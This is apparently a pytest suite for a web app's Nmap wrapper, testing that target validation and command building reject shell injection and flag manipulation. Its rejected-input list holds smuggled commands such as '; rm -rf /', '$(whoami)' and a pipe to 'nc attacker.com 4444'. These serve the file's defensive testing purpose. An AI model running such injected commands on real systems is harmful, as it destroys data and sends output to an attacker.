"""
Tests for the safe-argument/target validation logic that protects the
Nmap subprocess layer from injection and unauthorized flag manipulation.
"""

import pytest

from app.core.exceptions import ValidationError
from app.core.validators import (
    is_valid_cidr,
    is_valid_hostname,
    is_valid_ipv4,
    validate_target_address,
)
from app.models.scan import ScanProfile
from app.services.nmap_service import (
    NMAP_PROFILES,
    build_nmap_command,
    get_available_profiles,
)


# ---------------------------------------------------------------------------
# validate_target_address / individual predicate functions
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "address",
    [
        "192.168.1.1",
        "10.0.0.1",
        "203.0.113.25",
        "192.168.1.0/24",
        "example.com",
        "lab-host.internal.example",
        "a.b.c",
    ],
)
def test_validate_target_address_accepts_valid_values(address):
    assert validate_target_address(address) == address


@pytest.mark.parametrize(
    "address",
    [
        "",
        "   ",
        "8.8.8.8; rm -rf /",
        "8.8.8.8 && whoami",
        "$(whoami)",
        "`whoami`",
        "-oN /tmp/output.txt",
        "--script=vuln",
        "8.8.8.8|nc attacker.com 4444",
        "8.8.8.8\nrm -rf /",
        "target with spaces",
        "target;another",
    ],
)
def test_validate_target_address_rejects_malicious_or_malformed_values(address):
    with pytest.raises(ValidationError):
        validate_target_address(address)


def test_is_valid_ipv4():
    assert is_valid_ipv4("192.168.1.1") is True
    assert is_valid_ipv4("999.999.999.999") is False
    assert is_valid_ipv4("not-an-ip") is False


def test_is_valid_cidr():
    assert is_valid_cidr("192.168.1.0/24") is True
    assert is_valid_cidr("192.168.1.1") is True  # single host is valid CIDR too
    assert is_valid_cidr("not-a-cidr/24") is False


def test_is_valid_hostname():
    assert is_valid_hostname("example.com") is True
    assert is_valid_hostname("-invalid-start.com") is False
    assert is_valid_hostname("a" * 300) is False


# ---------------------------------------------------------------------------
# nmap_service: safe command construction
# ---------------------------------------------------------------------------


def test_build_nmap_command_uses_list_form_with_no_shell_metacharacters():
    command = build_nmap_command("192.168.1.10", ScanProfile.QUICK)

    assert isinstance(command, list)
    assert all(isinstance(arg, str) for arg in command)
    assert command[-1] == "192.168.1.10"
    assert "-oX" in command
    assert "-" in command
    # No argument should contain shell metacharacters, confirming the
    # command is safe to pass directly to subprocess.run(shell=False).
    for arg in command:
        assert ";" not in arg
        assert "&&" not in arg
        assert "|" not in arg


def test_build_nmap_command_rejects_injection_in_target():
    with pytest.raises(ValidationError):
        build_nmap_command("192.168.1.10; rm -rf /", ScanProfile.QUICK)


def test_all_scan_profiles_have_defined_argument_sets():
    for profile in ScanProfile:
        assert profile in NMAP_PROFILES
        args = NMAP_PROFILES[profile]
        assert isinstance(args, list)
        assert len(args) > 0
        # No profile should ever include an output-file or target flag —
        # those are appended programmatically, never user-controlled.
        assert "-oX" not in args
        assert "-oN" not in args


def test_get_available_profiles_matches_enum_values():
    profiles = get_available_profiles()
    expected = {p.value for p in ScanProfile}
    assert set(profiles) == expected